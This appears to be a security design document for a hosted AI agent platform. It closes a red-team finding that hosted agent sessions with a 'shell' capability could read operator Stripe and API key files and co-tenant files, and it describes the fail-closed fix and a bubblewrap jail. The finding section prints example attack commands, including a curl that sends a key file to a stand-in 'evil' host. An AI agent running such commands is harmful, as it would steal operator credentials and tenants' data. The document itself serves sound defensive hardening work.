# Hosted-session OS isolation — restoring `shell` safely

Status: **immediate fix LANDED · isolation core LANDED (launch mechanism) · the
deploy seam NAMED.** This closes the red-team CRITICAL "the `shell` cap is a host
shell on the operator's key-holding box."

## The finding

A hosted agent session (the SSH `dregg-agent attach`, the `agent-host` enrol path,
the portal web attach) runs on **shared infrastructure that also holds the
operator's keys** — `~/.nousportalkey`, `~/.stripekey`, `~/.nvidiakey`, the Nous
Portal / Stripe / NVIDIA credentials the brain and the Stripe skills use. A hosted
tenant granted the `shell` cap gets a real `bash -c` and can:

```
cat /home/op/.stripekey            # absolute-path read of the operator key
cat ~/.stripekey                   # (env-scrub re-roots $HOME, but…)
cat /home/other-tenant/.dregg/...  # a co-tenant's files
curl https://evil -d @/home/op/.stripekey   # raw egress exfiltration
```

The in-process floor that already landed — `harden_shell_env`
(`breadstuffs/dregg-agent/src/tools.rs`) — strips every secret-bearing env var and
re-roots `$HOME`/`$TMPDIR`/XDG into the workdir. That stops `echo $STRIPE_KEY` and
a `~`-relative read, but it **cannot** confine an absolute-path read or raw egress:
once `shell` is granted the `fs_*`/`http:` confinement is moot. `shell` is the one
tool in the bundle that is **not lexically confinable** in-process.

## The immediate fix (LANDED)

Drop `shell` from every HOSTED default, and refuse it at parse on the hosted path —
fail-closed — until OS isolation is present. A hosted session gets the
**lexically-confinable** tools only:

| Tool | Confinement |
|------|-------------|
| `fs` (`fs_read`/`fs_write`/`list_dir`/`mkdir`) | lexically rooted in the workdir (`OperatorTools::resolve` refuses any path escaping it) |
| `http:HOST` / `git:HOST` | per-host egress cap (one host each) |
| `pay:VENDOR` / `spend` / `provision:PROVIDER` | budget-gated Stripe skills (no FS/egress) |
| `cell:/path` | a named cell, cap-gated |
| **`shell`** | **NOT lexically confinable → LOCAL only, or HOSTED behind OS isolation** |

The LOCAL/HOSTED distinction is explicit:

- `breadstuffs/dregg-agent` — `session::Confinement::{Local,Hosted}`;
  `parse_caps_confined(.., Hosted)` returns an error naming `shell` and pointing
  here. `dregg-agent attach` is **always** hosted; `dregg-agent session` is local
  by default and `--hosted`/`--untrusted` forces the hosted posture;
  `dregg-agent run` (one-shot, the user's own box) stays local. The LOCAL default
  caps keep `shell`; the HOSTED default is `fs,http:api.github.com`.
- `DreggNet/agent-host` — `AgentHostRegistry` validates enrolments under the host's
  confinement posture: **Hosted by default** (a `shell` cap is refused at enrol),
  flipped to Local by `with_os_isolation(true)` / the `--os-isolation` flag once a
  jail is deployed. The forced command then carries `--os-isolation`, telling
  `attach` it may safely run the full toolkit inside the jail.

Proven (green): `dregg-agent` `session::tests::a_hosted_session_cannot_read_the_operator_keys`
(a model that tries `cat /home/op/.stripekey`, `cat ~/.stripekey`, and a curl-exfil
is cap-refused on every attempt — no shell tool in the bundle, no receipt, no
leak), `hosted_confinement_refuses_the_shell_cap_at_parse`; `agent-host`
`a_shell_cap_is_refused_at_enrol_without_os_isolation` (+ the allowed-with-isolation
twin).

## The proper fix — per-tenant OS isolation (the design)

Each hosted session runs as a **dedicated unprivileged unix user** inside a
**namespace jail** (bubblewrap / `unshare`) whose view of the world does NOT
contain the operator keys. With that boundary, a raw `shell` is safe again — there
is nothing to read and nowhere to send it.

### 1. Launch mechanism

`agent-host/src/isolation.rs` — `JailSpec::bwrap_argv()` is the concrete,
pure, **tested** launch mechanism: the exact `bwrap` argument vector a deploy runs.

```
bwrap --unshare-all --die-with-parent --new-session \
      --uid <tenant-uid> --gid <tenant-gid> \
      --clearenv \
      --setenv HOME <workdir> --setenv TMPDIR /tmp \
      --setenv XDG_CONFIG_HOME <workdir> --setenv XDG_DATA_HOME <workdir> \
      --setenv XDG_CACHE_HOME <workdir> \
      --setenv NOUS_PORTAL_KEY <…> --setenv STRIPE_KEY <…>   # brain-only keys, env-only
      --ro-bind-try /usr /usr --ro-bind-try /lib /lib … \
      --tmpfs /tmp \
      --bind <workdir> <workdir> --chdir <workdir> \
      -- dregg-agent attach --account … --os-isolation …
```

- **Filesystem** — the workdir is the ONLY writable mount; a minimal read-only
  runtime (`/usr`, `/lib`, …) is bound for the toolchain; `/tmp` is a private
  tmpfs. The operator home + key directory are **never bound** (`JailSpec`
  validates the workdir and runtime binds are clear of the `forbidden_paths`), so
  an absolute-path read finds nothing.
- **Network** — `--unshare-all` includes a fresh, empty net namespace → deny-default
  egress. The per-host `http:`/`git:` egress cap is enforced at the namespace edge
  by an outbound proxy (the only route out).
- **Identity** — a dedicated non-root uid/gid per tenant (`JailSpec` refuses uid/gid
  `0`); one session cannot read another's files even within the jailed view.
- **Key injection — to the BRAIN, never to the shell's FS view.** The LLM / Stripe
  keys are injected ONLY as env vars (`--setenv`); no key FILES exist in the jail.
  The brain reads them; the shell tool's existing `harden_shell_env` scrubs them
  before every spawn. So under the jail the env-scrub floor becomes
  load-bearing-and-sufficient: FS jail kills the file read, empty netns kills raw
  egress, env-scrub kills the env leak → `shell` is safe.

`JailSpec::launch()` spawns the jail on Linux; off-Linux it returns
`IsolationError::Unsupported` (fail-closed — a host that cannot confine never runs
the session unconfined). Tests: `the_argv_never_binds_the_operator_keys_or_home`,
`the_argv_is_deny_default_egress_nonroot_and_clears_env`,
`brain_keys_are_env_only_and_home_is_the_workdir`, `root_uid_or_relative_workdir_is_refused`.

### 2. The deploy seam (named, not closed here)

Standing the jail up in production needs, beyond the launch mechanism above:

1. **Linux + namespace privilege** — the host must allow user-namespace creation
   (or ship a setuid `bwrap`). The control-plane fleet nodes are Linux; this is the
   `tier`-selected Caged provider's home (`dreggnet-exec`).
2. **Per-tenant uid allocation** — a dedicated unprivileged uid/gid per enrolled
   subject (a simple high-range allocator keyed by the `dga1_` subject).
3. **A compiled seccomp-BPF / Landlock program** passed via `bwrap --seccomp <fd>`
   to pin syscalls/paths to the workdir subtree (the syscall twin of the mount
   confinement).
4. **The outbound egress proxy** wired to the session's per-host cap set, bound to
   the jail's net namespace edge.
5. **sshd wiring** — `AuthorizedKeysCommand` fed by the `agent-host` registry, the
   forced command launching `JailSpec::launch()` rather than `attach` directly.

Once (1)–(5) are wired, set `AgentHostRegistry::with_os_isolation(true)` (or pass
`--os-isolation` to `dreggnet-agent-hostctl`) and `shell` is grantable again on the
hosted path — safely.

## Deploy hardening shipped alongside

- **Caddy subject-spoofing strip** (`deploy/staging/Caddyfile`) — the
  `(dregg_strip_forged_identity)` snippet deletes any client-supplied
  `X-Dregg-Subject` / `-Cap` / `-Auth` / `-Break-Glass` BEFORE the webauth
  forward-auth, on the live `console.example.com` route and the reviewed-go
  `attach.example.com` route, with the private-upstream requirement noted (the
  gated upstreams must be Caddy-only).
- **Session quotas** — per-subject + global live-session caps in
  `attach::store::SessionStore::create`/`fork_for` (`DEFAULT_MAX_PER_SUBJECT`,
  `DEFAULT_MAX_TOTAL`) and a per-account enrol quota in `agent-host`
  (`DEFAULT_SESSIONS_PER_ACCOUNT`), closing the resource-exhaustion vector.
